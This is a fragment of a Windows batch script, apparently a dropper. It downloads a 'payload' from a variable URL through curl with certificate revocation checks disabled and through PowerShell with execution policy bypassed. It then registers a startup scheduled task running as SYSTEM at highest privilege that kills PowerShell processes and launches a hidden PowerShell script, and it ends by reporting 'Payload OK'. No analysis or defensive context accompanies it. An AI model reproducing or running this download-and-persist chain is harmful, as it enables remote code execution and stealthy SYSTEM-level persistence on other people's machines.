...
curl.exe -L --ssl-no-revoke -H "Cache-Control: no-cache" -H "Pragma: no-cache" -o "%B64%" "%PAYURL%"
...
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('%PAYURL%','%B64%')"
if not exist "%B64%" (
...
schtasks /Create /TN "%ONCETASK%" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c taskkill /F /IM powershell.exe & ping -n 4 127.0.0.1 >nul & powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%PS1%\""
if errorlevel 1 (
...
echo Payload OK [%MARKER%], launched via single SYSTEM task.
echo Wait 180s then check .diag.log
exit /b 0
